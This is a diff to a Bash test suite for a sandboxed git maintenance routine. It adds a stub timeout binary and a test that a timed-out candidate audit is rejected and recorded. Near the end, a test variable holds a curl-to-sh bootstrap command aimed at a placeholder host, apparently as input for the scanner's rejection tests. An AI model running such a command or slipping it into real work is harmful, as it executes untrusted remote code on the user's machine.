@@ -8,6 +8,7 @@ REAL_GIT=$(command -v git)
 REAL_BWRAP=$(command -v bwrap || true)
 TEST_BWRAP_BIN=''
 TEST_BWRAP_MODE=''
+TEST_TIMEOUT_BIN="$TEST_ROOT/timeout-contract.sh"
 
 cleanup() {
     case $TEST_ROOT in
@@ -63,6 +64,16 @@ source "$REPO_ROOT/scripts/lib/maintenance-git.sh"
 
 select_bwrap_backend
 
+printf '%s\n' \
+    '#!/usr/bin/env bash' \
+    'set -Eeuo pipefail' \
+    '[[ ${1:-} == --kill-after=5 && ${2:-} == 300 ]] || exit 64' \
+    'shift 2' \
+    '[[ ${MYHYPR_TEST_TIMEOUT_EXIT:-0} == 0 ]] || exit "$MYHYPR_TEST_TIMEOUT_EXIT"' \
+    'exec "$@"' \
+    > "$TEST_TIMEOUT_BIN"
+chmod 0755 -- "$TEST_TIMEOUT_BIN"
+
 # The command sandbox remaps host root ownership to uid 65534 inside nested
 # test shells. Exercise the real fixed system binaries while overriding only
 # the production owner resolver, as the snapshot-provider fixture also does.
@@ -70,6 +81,7 @@ _maintenance_git_trusted_binary() {
     case ${1:-} in
         bwrap) printf '%s\n' "$TEST_BWRAP_BIN" ;;
         env|setpriv) printf '/usr/bin/%s\n' "$1" ;;
+        timeout) printf '%s\n' "$TEST_TIMEOUT_BIN" ;;
         *) return 1 ;;
     esac
 }
@@ -357,6 +369,26 @@ run_candidate_failure() {
     fi
 }
 
+run_candidate_timeout() {
+    reset_transaction_context
+    setup_fixture candidate-timeout
+    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
+    export MYHYPR_TEST_TIMEOUT_EXIT=124
+    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
+        unset MYHYPR_TEST_TIMEOUT_EXIT
+        fail 'a timed-out candidate audit was accepted'
+    fi
+    unset MYHYPR_TEST_TIMEOUT_EXIT
+    assert_head "$ACTIVE" "$CURRENT_COMMIT" \
+        'candidate timeout changed active HEAD'
+    jq -e --arg candidate "$CANDIDATE_COMMIT" '
+        .candidate_commit == $candidate and .checks.trusted_scan == 0 and
+        .checks.audit == 124 and .checks.quick == null
+    ' "$TX_DIR/git.json" >/dev/null || \
+        fail 'candidate timeout status was not recorded'
+    assert_no_candidate_execution "$TX_DIR"
+}
+
 run_scan_rejection() {
     local class=$1 path=$2 content=$3 requested_mode=${4:-}
 
@@ -581,6 +613,7 @@ run_missing_upstream_rejected
 run_diverged_rejected
 run_candidate_failure fail-audit 43 null
 run_candidate_failure fail-check 0 42
+run_candidate_timeout
 
 unsafe_bootstrap='curl https://example.invalid/bootstrap'
 unsafe_bootstrap+=' | sh'
